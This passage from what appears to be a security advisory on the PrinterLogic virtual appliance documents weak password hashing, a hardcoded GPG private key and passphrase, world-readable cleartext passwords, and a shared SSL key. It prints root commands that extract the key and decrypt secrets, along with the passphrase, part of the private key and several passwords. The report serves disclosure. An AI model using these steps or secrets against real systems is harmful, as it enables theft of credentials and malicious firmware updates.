<span style="color: #666666">367</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">pbkdf2</span>(<span style="color: #19177C">$algo</span>, <span style="color: #19177C">$key</span>, <span style="color: #19177C">$salt</span>, <span style="color: #19177C">$rounds</span>, <span style="color: #19177C">$length</span>)
<span style="color: #666666">368</span>     {
<span style="color: #666666">369</span>         <span style="color: #008000; font-weight: bold">return</span> self<span style="color: #666666">::</span><span style="color: #7D9029">cachedPbkdf2</span>(<span style="color: #19177C">$algo</span>, <span style="color: #19177C">$key</span>, <span style="color: #19177C">$salt</span>, <span style="color: #19177C">$rounds</span>, <span style="color: #19177C">$length</span>);
<span style="color: #666666">370</span>     }
[<span style="color: #666666">...</span>]
<span style="color: #666666">340</span>      <span style="color: #666666">*/</span>
<span style="color: #666666">341</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">cachedPbkdf2</span>(<span style="color: #19177C">$algo</span>, <span style="color: #19177C">$key</span>, <span style="color: #19177C">$salt</span>, <span style="color: #19177C">$rounds</span>, <span style="color: #19177C">$length</span>)
<span style="color: #666666">342</span>     {
<span style="color: #666666">343</span>         <span style="color: #19177C">$bucket</span> <span style="color: #666666">=</span> <span style="color: #19177C">$algo</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;.&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$rounds</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;.&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$length</span>;
<span style="color: #666666">344</span>         <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span><span style="color: #008000">isset</span>(self<span style="color: #666666">::</span><span style="color: #19177C">$pbkdf2Cache</span>[<span style="color: #19177C">$bucket</span>][<span style="color: #19177C">$key</span>][<span style="color: #19177C">$salt</span>])) {
<span style="color: #666666">345</span>             <span style="color: #19177C">$hash</span> <span style="color: #666666">=</span> self<span style="color: #666666">::</span><span style="color: #7D9029">PrinterLogicHashPbkdf2</span>(<span style="color: #19177C">$algo</span>, <span style="color: #19177C">$key</span>, <span style="color: #19177C">$salt</span>, <span style="color: #19177C">$rounds</span>, <span style="color: #19177C">$length</span>);
[<span style="color: #666666">...</span>]
<span style="color: #666666">288</span>     <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">289      * Identical to built in function hash_pbkdf2 ... except it isn&#39;t.  This produces different results.</span>
<span style="color: #BA2121; font-style: italic">290      * Despite being much slower, its what is already in the wild, changing it now would be difficult.</span>
<span style="color: #BA2121; font-style: italic">291      *</span>
<span style="color: #BA2121; font-style: italic">292      * @param $algorithm</span>
<span style="color: #BA2121; font-style: italic">293      * @param $key</span>
<span style="color: #BA2121; font-style: italic">294      * @param $salt</span>
<span style="color: #BA2121; font-style: italic">295      * @param $rounds</span>
<span style="color: #BA2121; font-style: italic">296      * @param $length</span>
<span style="color: #BA2121; font-style: italic">297      * @return bool|string</span>
<span style="color: #BA2121; font-style: italic">298      */</span>
<span style="color: #666666">299</span>     <span style="color: #008000; font-weight: bold">private</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">PrinterLogicHashPbkdf2</span>(<span style="color: #19177C">$algorithm</span>, <span style="color: #19177C">$key</span>, <span style="color: #19177C">$salt</span>, <span style="color: #19177C">$rounds</span>, <span style="color: #19177C">$length</span>)
<span style="color: #666666">300</span>     {
<span style="color: #666666">301</span>         <span style="color: #19177C">$size</span> <span style="color: #666666">=</span> <span style="color: #008000">strlen</span>(<span style="color: #008000">hash</span>(<span style="color: #19177C">$algorithm</span>, <span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #008000; font-weight: bold">true</span>));
<span style="color: #666666">302</span>         <span style="color: #19177C">$len</span> <span style="color: #666666">=</span> <span style="color: #008000">ceil</span>(<span style="color: #19177C">$length</span> <span style="color: #666666">/</span> <span style="color: #19177C">$size</span>);
<span style="color: #666666">303</span>         <span style="color: #19177C">$result</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>;
<span style="color: #666666">304</span>         <span style="color: #008000; font-weight: bold">for</span> (<span style="color: #19177C">$i</span> <span style="color: #666666">=</span> <span style="color: #666666">1</span>; <span style="color: #19177C">$i</span> <span style="color: #666666">&lt;=</span> <span style="color: #19177C">$len</span>; <span style="color: #19177C">$i</span><span style="color: #666666">++</span>) {
<span style="color: #666666">305</span>             <span style="color: #19177C">$tmp</span> <span style="color: #666666">=</span> <span style="color: #008000">hash_hmac</span>(<span style="color: #19177C">$algorithm</span>, <span style="color: #19177C">$salt</span> <span style="color: #666666">.</span> <span style="color: #008000">pack</span>(<span style="color: #BA2121">&#39;N&#39;</span>, <span style="color: #19177C">$i</span>), <span style="color: #19177C">$key</span>, <span style="color: #008000; font-weight: bold">true</span>);
<span style="color: #666666">306</span>             <span style="color: #19177C">$res</span> <span style="color: #666666">=</span> <span style="color: #19177C">$tmp</span>;
<span style="color: #666666">307</span>             <span style="color: #008000; font-weight: bold">for</span> (<span style="color: #19177C">$j</span> <span style="color: #666666">=</span> <span style="color: #666666">1</span>; <span style="color: #19177C">$j</span> <span style="color: #666666">&lt;</span> <span style="color: #19177C">$rounds</span>; <span style="color: #19177C">$j</span><span style="color: #666666">++</span>) {
<span style="color: #666666">308</span>                 <span style="color: #19177C">$tmp</span> <span style="color: #666666">=</span> <span style="color: #008000">hash_hmac</span>(<span style="color: #19177C">$algorithm</span>, <span style="color: #19177C">$tmp</span>, <span style="color: #19177C">$key</span>, <span style="color: #008000; font-weight: bold">true</span>);
<span style="color: #666666">309</span>                 <span style="color: #19177C">$res</span> <span style="color: #666666">^=</span> <span style="color: #19177C">$tmp</span>;
<span style="color: #666666">310</span>             }
<span style="color: #666666">311</span>             <span style="color: #19177C">$result</span> <span style="color: #666666">.=</span> <span style="color: #19177C">$res</span>;
<span style="color: #666666">312</span>         }
<span style="color: #666666">313</span>         <span style="color: #008000; font-weight: bold">return</span> <span style="color: #008000">substr</span>(<span style="color: #19177C">$result</span>, <span style="color: #666666">0</span>, <span style="color: #19177C">$length</span>);
<span style="color: #666666">314</span>     }
</pre></div>

<p>This code is very similar to the example shown on PHP.net: </p>
<p><img alt="" src="images/2025-vasion-report-1-php-net.png" />
<a href="https://www.php.net/manual/en/function.hash-pbkdf2.php#118301">https://www.php.net/manual/en/function.hash-pbkdf2.php#118301</a></p>
<p>SHA-1 and SHA-512 are used to compute a cryptographic summary (checking the integrity of a file or making an electronic signature). They are not suitable for storing passwords because they are fast to calculate.</p>
<p>Storing passwords in SHA-512 does not follow best security practices. There is no salt and the hashes are easily bruteforcable or found using rainbow tables.</p>
<p>Fall-back to SHA-1 absolutely does not follow best security practices. There is no salt and the hashes are easily bruteforcable or found using rainbow tables.</p>
<p><a id="va-private-gpg-key"></a></p>
<h2>Details - GPG Private key stored in the solution</h2>
<p>It was observed the firmware update images were encrypted but not signed.</p>
<p>The Docker images contain the public and private keys for <code>no-reply+virtual-appliance@printerlogic.com</code>.</p>
<p>Extraction of the GPG private key:</p>
<pre><code>root@printerlogic:~# cp -r /var/lib/docker/overlay2/./995aff33d0f19af66d462b38164604709d2164b47b057411a1fcac3ef0118197/diff/home/ubuntu/.gnupg/ ~/
root@printerlogic:~# grep GPG /var/lib/docker/image/overlay2/imagedb/content/sha256/*
[...]
APPLIANCE_GPG_PASSPHRASE=50370a0d-65b4-4b2a-a2a2-ea0d6ff35ef4
[...]
root@printerlogic:~# gpg --list-keys --with-keygrip
/root/.gnupg/pubring.kbx
------------------------
pub   rsa4096 2020-01-23 [SC]
      CADA0B06D8ADA5A72C52F5FB09BD9E367DA10998
      Keygrip = 5FA855131102B4D03D9D21F1D081CB1DBA100953
uid           [ultimate] PrinterLogic Virtual Appliance Team &lt;no-reply+virtual-appliance@printerlogic.com&gt;
sub   rsa4096 2020-01-23 [E]
      Keygrip = 45066ADCF538743121004158DD3BA4C62EA82177
sub   rsa4096 2020-01-23 [S]
      Keygrip = DD8FA6CE5BAA3DF02E406A0ECF9F798F43E146F9

root@printerlogic:~# gpg --list-secret-keys
/root/.gnupg/pubring.kbx
------------------------
sec#  rsa4096 2020-01-23 [SC] 
      CADA0B06D8ADA5A72C52F5FB09BD9E367DA10998
uid           [ultimate] PrinterLogic Virtual Appliance Team &lt;no-reply+virtual-appliance@printerlogic.com&gt;
ssb   rsa4096 2020-01-23 [E]
ssb#  rsa4096 2020-01-23 [S]

root@printerlogic:~# gpg --export-secret-keys -a &gt; out.key
[50370a0d-65b4-4b2a-a2a2-ea0d6ff35ef4]
root@printerlogic:~# less out.key 
-----BEGIN PGP PRIVATE KEY BLOCK-----

lQIVBF4qHKgBEAC3T56eTrfTkPZrLwKUla4FSbdd2QTQU5XsXT6gCc6TpadMF1XY
2GfZaUcQ5G0DOWRQpy9rxBh+ZiffqbDFKyHLmSG4RrYpeR0jttUdVEdQ99II0kfB
41bo59iJkYM6EGAm2htBrstUnOwyFMn1DH8PBs/Pp+N8kaOCa+BgjKyxvQvXHXSz
b9dt6TLPRnloO4hJXJI1htHMFdBTpzJKY8gKnug/XO7Vkq5j3mCcGM/5K4fzKYoE
fFmQO9sjnzG6hnon+9tUsexmnCosk5a+HzpGthrx3/MIFHMe02ZL7VGuxOUyL618
wEa4CbnxMwsW14FzOjPubaMsgsQhuH3X2yiVgJw2i0c1IUmFiEdeTZ29tDlhsUmM
pNqGgvp41t41PD6EoA4KhdyGh0GTtzz97QoY1HTpbTF3vPChRgWFMDnw+1jXd3Q7
m6Zgkn2iVFVb+bUT5VZAnT7okJHP8ZKtqm97YxliUft1JQvISaVaoL0VOyB6P83T
1CeVTtMLsZRgooKIyOTyxPzRZxqmYhGMOam7KY/syKZRw5zIcBGGpuZ6xQRSKYRG
hZhDFZFmvO7EkQoPJaYsX6IY3oOwZ1GTq1mWQ062FzmPA4gWffOUGGdbrZuJSPg5
1OsFVcXeg8KGqJOAQBVG4gQ7mbjv2F5Srll6S9k7X8i0XXFoBMLZ9bt9pwARAQAB
/wBlAEdOVQG0UVByaW50ZXJMb2dpYyBWaXJ0dWFsIEFwcGxpYW5jZSBUZWFtIDxu
by1yZXBseSt2aXJ0dWFsLWFwcGxpYW5jZUBwcmludGVybG9naWMuY29tPokCTgQT
AQgAOAIbAwIeAQIXgBYhBMraCwbYraWnLFL1+wm9njZ9oQmYBQJeKh7OBQsJCAcD
[...]
</code></pre>
<p>The passphrase for the private key is also hardcoded and can be found in files present in the directory <code>/var/lib/docker/image/overlay2/imagedb/content/sha256</code>.</p>
<p>After the extraction of the key is done, the private key is under attacker's control. This key has been installed in another Linux machine under attacker's control and can generate legit malicious update images:</p>
<pre><code>kali% gpg --list-secret-keys
/home/user/.gnupg/pubring.kbx
-----------------------------
sec#  rsa4096 2020-01-23 [SC]
      CADA0B06D8ADA5A72C52F5FB09BD9E367DA10998
uid           [ unknown] PrinterLogic Virtual Appliance Team &lt;no-reply+virtual-appliance@printerlogic.com&gt;
ssb   rsa4096 2020-01-23 [E]
ssb#  rsa4096 2020-01-23 [S]
kali%
</code></pre>
<p>An attacker with admin privileges on the solution can upload custom encrypted updates.</p>
<p>Decrypting the firmware image using the private key, encrypting using the public key and decrypting this file using the private key:</p>
<pre><code>kali% gpg 20.0.1305.gpg
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 4096-bit RSA key, ID FCF4134A2496B21A, created 2020-01-23
      "PrinterLogic Virtual Appliance Team &lt;no-reply+virtual-appliance@printerlogic.com&gt;"
^C
gpg: signal Interrupt caught ... exiting

kali% echo test | gpg --encrypt -a -r no-reply+virtual-appliance@printerlogic.com -o test.gpg
gpg: FCF4134A2496B21A: There is no assurance this key belongs to the named user

sub  rsa4096/FCF4134A2496B21A 2020-01-23 PrinterLogic Virtual Appliance Team &lt;no-reply+virtual-appliance@printerlogic.com&gt;
 Primary key fingerprint: CADA 0B06 D8AD A5A7 2C52  F5FB 09BD 9E36 7DA1 0998
      Subkey fingerprint: 15CD B10F F97C 6F80 6B9D  979C FCF4 134A 2496 B21A

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y
kali% gpg test.gpg 
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 4096-bit RSA key, ID FCF4134A2496B21A, created 2020-01-23
      "PrinterLogic Virtual Appliance Team &lt;no-reply+virtual-appliance@printerlogic.com&gt;"
kali% cat test
test
kali%
</code></pre>
<p>Furthermore, it was observed this private key was also used by the support:</p>
<p>Content of <code>/var/www/cicd-linux-ops/bin/va-rotate-secrets.sh</code>:</p>
<pre>
#!/bin/bash -l

# Setup logging
LOG_TAG="va/rotate-secrets"
LOG_CAPTURE_ERRORS=true
. ${CICD_DIR}/includes/func_logging.sh

# Portainer rotation
# The portainer password is stored in plaintext in the location noted below.  To rotate this password, we simply need to
# set a new password in this file, then save the gpg-encrypted version in our storage location.  <font color=red>We store an encrypted form 
# there to allow our advanced customer support to have access, only as a last resort.  Customers should NEVER be allowed
# to have access to portainer, even on a temporary basis.  Only a member of an advanced support team should be able to
# enable portainer (enabled via environment variable), decrypt the password found in persistent storage, then access portainer</font>
log "Rotating Portainer password"
PORTAINER_PASSWORD_FILE=${PRINTERCLOUD_CONFIG_DIR}/portainer-admin-password.txt

# Generate a new portainer password and write it to the plaintext location
PLAINTEXT_PASSWORD=$(cat /proc/sys/kernel/random/uuid)
echo "${PLAINTEXT_PASSWORD}" >${PORTAINER_PASSWORD_FILE}

# Store the encrypted version
SECRETS_DIR=${APPLIANCE_STORAGE_TARGET}/.secrets
PORTAINER_PASSWORD_FILE_ENCRYPTED=${SECRETS_DIR}/portainer-admin.gpg

# Make sure file and dir exist first
mkdir -p ${SECRETS_DIR}
touch ${PORTAINER_PASSWORD_FILE_ENCRYPTED}
set-secret.sh -f ${PORTAINER_PASSWORD_FILE_ENCRYPTED} --encrypt PORTAINER_PASSWORD=${PLAINTEXT_PASSWORD}
log "Finished rotating Portainer password"

# Force a logout/shutdown if the UI is running
if [[ "${REPLICAS_PORTAINER_UI}" -ge 1 ]]; then 
  log "Forcing Portainer shutdown"
  set-secret.sh "REPLICAS_PORTAINER_UI=0"
fi
</pre>

<p>GPG is used to encrypt the portainer password and the resulting file is located in <code>/var/www/efs_storage/.secrets/portainer-admin.gpg</code>. It can be decrypted using the private key as shown below.</p>
<p>To confirm the key is indeed common to all installed solutions, another test solution has been installed and I was able to decrypt the GPG files located in <code>/var/www/efs_storage/.secrets</code> - this confirms the private key can be used in all installed solutions:</p>
<pre>
kali% scp -r root@10.105.0.242:/var/www/efs_storage/.secrets . 
app-keys.gpg                                          100%  704     1.0MB/s   00:00    
portainer-admin.gpg                                   100%  660     1.0MB/s   00:00    
kali% cd .secrets
kali% gpg app-keys.gpg 
gpg: encrypted with 4096-bit RSA key, ID FCF4134A2496B21A, created 2020-01-23
      "PrinterLogic Virtual Appliance Team <no-reply+virtual-appliance@printerlogic.com>"
kali% cat app-keys
<font color=red>APP_KEY="WtlAAtpHpgRnFwdseoejTYNHaEobvKZ1"
MYSQL_ROOT_PASSWORD="fbaf64cf-43fd-4572-a123-dccc97ae7f88"</font>
kali% gpg portainer-admin.gpg 
gpg: encrypted with 4096-bit RSA key, ID FCF4134A2496B21A, created 2020-01-23
      "PrinterLogic Virtual Appliance Team <no-reply+virtual-appliance@printerlogic.com>"
kali% cat portainer-admin     
<font color=red>PORTAINER_PASSWORD="644e3db6-6058-4771-955f-cfb7fa693c7d"</font>
kali%
</pre>

<p>But the portainer password is also freely available by reading the world-readable file <code>/etc/printercloud/portainer-admin-password.txt</code>:</p>
<pre>
root@printerlogic:/var/www/efs_storage/.secrets# ls -la /etc/printercloud/portainer-admin-password.txt
<font color=red>-rw-r--r--</font> 1 ubuntu docker 37 Feb  9 08:48 /etc/printercloud/portainer-admin-password.txt
root@printerlogic:/var/www/efs_storage/.secrets# cat /etc/printercloud/portainer-admin-password.txt
<font color=red>4784ceb0-1960-4ba7-997b-022907cdf14b</font>
root@printerlogic:/var/www/efs_storage/.secrets# gpg portainer-admin.gpg 
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 4096-bit RSA key, ID FCF4134A2496B21A, created 2020-01-23
      "PrinterLogic Virtual Appliance Team <no-reply+virtual-appliance@printerlogic.com>"

root@printerlogic:/var/www/efs_storage/.secrets# cat portainer-admin
<font color=red>PORTAINER_PASSWORD="4784ceb0-1960-4ba7-997b-022907cdf14b"</font>
root@printerlogic:/var/www/efs_storage/.secrets#
</pre>

<p>It is also possible to install a malicious firmware update. The firmware file will be stored inside <code>/var/www/efs_storage/.updates</code> and will be installed:</p>
<pre><code>root@printerlogic:/var/www/efs_storage/.updates# ls -latr
total 4810592
-rwxrwxr-x+  1 root     docker 4898676615 Jan 27 10:04 20.0.1305.gpg
drwxrwsr-x+  2 ubuntu   docker       4096 Jan 27 10:18 .patches
drwxrwsr-x+ 19 www-data docker       4096 Feb  2 08:15 ..
-rwxrwxr-x+  1 root     docker      77476 Feb 11 05:13 untitled.gpg
-rwxrwxr-x+  1 root     docker   27262976 Feb 11 05:56 malicious.update.gpg
-rwxrwxr-x+  1 root     docker        128 Feb 11 06:00 malicious.update2.gpg
drwxrwsr-x+  3 root     docker       4096 Feb 11 06:00 .
root@printerlogic:/var/www/efs_storage/.updates#
</code></pre>
<p>An attacker with admin privileges on the solution can upload custom signed updates to compromise the application.</p>
<p>An attacker can decrypt any GPG-encrypted file located in <code>/var/www/efs_storage/.secrets</code> and retrieve the mysql root password, the <code>APP_KEY</code> password and the portainer password.</p>
<p><a id="va-readable-passwords"></a></p>
<h2>Details - Passwords readable and stored in clear-text</h2>
<p>The solution stores passwords in clear-text in some world-readable files:</p>
<ul>
<li>/etc/printercloud/network.env</li>
<li>/etc/printercloud/appliance.env</li>
<li>/etc/printercloud/portainer-admin-password.txt</li>
<li>/etc/printercloud/previous-db-password.txt</li>
<li>/etc/printercloud/secrets.configuring.bak</li>
<li>/var/www/efs_storage/secrets.env</li>
<li>/var/www/efs_storage/.secrets/app-keys.gpg</li>
<li>/var/www/efs_storage/.secrets/portainer-admin.gpg</li>
<li>/var/www/efs_storage/logs/<em>/{pi,services}.log</em></li>
<li>/var/lib/docker/swarm/worker/tasks.db</li>
<li>...</li>
</ul>
<p>The above provided list is not exhaustive.</p>
<p><code>/etc/printercloud/network.env</code> with insecure permissions:</p>
<pre>
root@printerlogic:~# ls -la /etc/printercloud/network.env
<font color=red>-rw-rw-r--</font> 1 ubuntu docker 29 Feb  8 01:51 /etc/printercloud/network.env
root@printerlogic:~# cat /etc/printercloud/network.env
<font color=red>NETWORK_USR_PWD="kZEXhhyjIY"</font>
root@printerlogic:~#
</pre>

<p><code>/etc/printercloud/appliance.env</code> with insecure permissions:</p>
<pre>
root@printerlogic:~# ls -la /etc/printercloud/appliance.env
<font color=red>-rwxrwxr-x</font> 1 ubuntu docker 858 Jan 27 10:16 /etc/printercloud/appliance.env
root@printerlogic:~# cat /etc/printercloud/appliance.env
[...]
# Anything below this line has been added via script/automation
VA_VERSION="1.0.730"
<font color=red>MS_AUTH_KEY="ccb33b57-7960-409c-9d15-b6c5b475c839"
APPLIANCE_LOG_DIR="/var/www/efs_storage/logs/oddhok71vqjdjhjtous8xy3vx"
APP_KEY="1U3leCKOyUKV2NHfYHFJ3bH9l5JU8X7M"
MYSQL_ROOT_PASSWORD="0aa58a30-9f32-4731-a03c-3795fe49c0f3"</font>
[...]
root@printerlogic:~#
</pre>

<p><code>/etc/printercloud/previous-db-password.txt</code> with insecure permissions:</p>
<pre>
root@printerlogic:~# ls -la /etc/printercloud/previous-db-password.txt
<font color=red>-rw-rw-r--</font> 1 ubuntu docker 44 Feb  8 01:51 /etc/printercloud/previous-db-password.txt
root@printerlogic:~# cat /etc/printercloud/previous-db-password.txt
<font color=red>PREVIOUS_DB_PASSWORD="BBlIL1X1ARvyrnA3FBpt"</font>
root@printerlogic:~#
</pre>

<p><code>/etc/printercloud/secrets.configuring.bak</code> with insecure permissions:</p>
<pre>
root@printerlogic:~# ls -la /etc/printercloud/secrets.configuring.bak
<font color=red>-rwxr-xr-x</font> 1 root root 3519 Jan 27 09:36 /etc/printercloud/secrets.configuring.bak
root@printerlogic:~# cat /etc/printercloud/secrets.configuring.bak
DB_DATABASE="app_pi"
<font color=red>DB_PASSWORD="BBlIL1X1ARvyrnA3FBpt"
DB_PORT="3306"
DB_USERNAME="admin"
PRINTERCLOUD_DOMAIN="10.105.0.241"
SAMBA_PASSWORD="4rd7AqdBvj7ZdGKrvQ9Z"</font>
</pre>

<p><code>/var/www/efs_storage/secrets.env</code> with insecure permissions:</p>
<pre>
root@printerlogic:/var/www/efs_storage# ls -la /var/www/efs_storage/secrets.env
<font color=red>-rwxrwsr-x+</font> 1 root docker 3519 Jan 27 09:36 /var/www/efs_storage/secrets.env
root@printerlogic:/var/www/efs_storage# cat secrets.env
DB_DATABASE="app_pi"
<font color=red>DB_PASSWORD="BBlIL1X1ARvyrnA3FBpt"
DB_PORT="3306"
DB_USERNAME="admin"
PRINTERCLOUD_DOMAIN="10.105.0.241"
SAMBA_PASSWORD="4rd7AqdBvj7ZdGKrvQ9Z"</font>
</pre>

<p>It is also possible to decrypt the gpg-encrypted files found in <code>/var/www/efs_storage/.secrets</code> using the private key that was extracted before:</p>
<pre>
root@printerlogic:~# ls -la /var/www/efs_storage/.secrets/
total 16
drwxrwsr-x+  2 ubuntu   docker 4096 Feb  8 06:38 .
drwxrwsr-x+ 19 www-data docker 4096 Feb  2 08:15 ..
<font color=red>-rw-rw-r--+</font>  1 ubuntu   docker  704 Jan 27 09:36 app-keys.gpg
<font color=red>-rw-rw-r--+</font>  1 ubuntu   docker  660 Feb  7 08:59 portainer-admin.gpg
root@printerlogic:~# cd /var/www/efs_storage/.secrets
root@printerlogic:/var/www/efs_storage/.secrets# gpg app-keys.gpg
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 4096-bit RSA key, ID FCF4134A2496B21A, created 2020-01-23
      "PrinterLogic Virtual Appliance Team <no-reply+virtual-appliance@printerlogic.com>"
root@printerlogic:/var/www/efs_storage/.secrets# cat app-keys
<font color=red>APP_KEY="1U3leCKOyUKV2NHfYHFJ3bH9l5JU8X7M"
MYSQL_ROOT_PASSWORD="0aa58a30-9f32-4731-a03c-3795fe49c0f3"</font>
root@printerlogic:/var/www/efs_storage/.secrets# gpg portainer-admin.gpg 
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 4096-bit RSA key, ID FCF4134A2496B21A, created 2020-01-23
      "PrinterLogic Virtual Appliance Team <no-reply+virtual-appliance@printerlogic.com>"
root@printerlogic:/var/www/efs_storage/.secrets# cat portainer-admin
<font color=red>PORTAINER_PASSWORD="1bd01aeb-e29d-4de6-83ca-11e55858c6ae"</font>
root@printerlogic:/var/www/efs_storage/.secrets#
</pre>

<p><code>/var/lib/docker/swarm/worker/tasks.db</code> with insecure permissions:</p>
<pre>
root@printerlogic:/var/lib/docker/swarm/worker# ls -la /var/lib/docker/swarm/worker/tasks.db
<font color=red>-rw-r--r--</font> 1 root root 2097152 Feb  9 03:37 /var/lib/docker/swarm/worker/tasks.db
root@printerlogic:/var/lib/docker/swarm/worker# strings /var/lib/docker/swarm/worker/tasks.db | grep -i pass
<font color=red>MYSQL_DATABASE=app_pi*#MYSQL_PASSWORD=BBlIL1X1ARvyrnA3FBpt*8MYSQL_ROOT_PASSWORD=0aa58a30-9f32-4731-a03c-3795fe49c0f3*
9mysqladmin -uadmin --password='BBlIL1X1ARvyrnA3FBpt'</font>
[...]
</pre>

<p>The directory <code>/var/lib/docker/swarm</code> is <code>700</code> so the exposure of the <code>tasks.db</code> file is limited.    </p>
<p>An attacker with access to the main filesystem can compromise the solution.</p>
<p>An attacker with access to a Docker instance that mounts <code>/var/www/efs_storage</code> can compromise the solution.</p>
<p>The provided list is not exhaustive; it is advised to review the solution to find more files containing passwords in clear-text.</p>
<p><a id="va-hardcoded-ssl-private-key"></a></p>
<h2>Details - Hardcoded SSL certificate / Private keys</h2>
<p>Some Docker instances contain a hardcoded private key for the SSL certificate of <code>pl-local.com</code>.</p>
<p>Docker instances containing <code>/etc/ssl/private/pl-local.com.key</code> and <code>/etc/ssl/certs/pl-local.com.pem</code>:</p>
<pre><code>root@printerlogic:~# for i in $(docker ps | awk '{ print $1 }'); do echo $(docker ps | grep $i); docker exec -it $i sha256sum /etc/ssl/private/pl-local.com.key /etc/ssl/certs/pl-local.com.pem;done
b836228df432 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 6 hours ago Up 6 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-seeder.1.zbh6pg52gjaa9gn5xqtc7taj5
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
05e23b975354 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 6 hours ago Up 6 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-reports.1.qimjcm6p2ky6r5cmoytg7buw2
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
5b81f67f8921 printerlogic/scim:1.0.9 "/var/www/app/.docke" 6 hours ago Up 6 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_scim.1.kstnz1b2i6h2bqs69azk50l3r
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
0b6c0bc767aa printerlogic/pq:5.0.124 "/var/www/app/.docke" 6 hours ago Up 6 hours (healthy) 80/tcp, 443/tcp, 9000/tcp printercloud_pq.1.rnyjdcu5oxkto8tib6s4esxu7
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
7f52a38a45d1 printerlogic/sched:1.0.18 "/var/www/app/.dock" 6 hours ago Up 6 hours 80/tcp, 443/tcp, 9000/tcp printercloud-appliance_worker-scheduler.1.jn23ywopn7apb9qcplrpe1xcc
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
cbb00388efa6 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 6 hours ago Up 6 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-snmp.1.mw9bfqfog2hm26wk527b5zfls
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
7efd81083d4e printerlogic/gw:1.208.5 "/var/www/app/.docke" 6 hours ago Up 6 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_gw.1.c68jpas58ra6qv56mrgavwrab
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
02c86f8d174e printerlogic/users:5.186.1 "/var/www/app/.docke" 6 hours ago Up 6 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_users.1.3tkj8z26r2jiz5jmmt7wsxzs0
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
375459c3f176 printerlogic/va-cdn:0.0.435 "/docker-entrypoint." 6 hours ago Up 6 hours 80/tcp printercloud-appliance_va-cdn.1.xokrstwpp8o7ykgcpwcdldjue
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
b141c9f47ae2 printerlogic/cpp-ui:1.80.5 "/var/www/app/.docke" 6 hours ago Up 6 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_cpp-ui.1.4zg2dyrl36sdhnnt9wdiahfb4
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
1671f7750d2a mysql:8.0.26 "docker-entrypoint.s" 6 hours ago Up 6 hours (healthy) 3306/tcp, 33060/tcp storage_mysql.1.5chx6h1st15x31gc5wpollzii
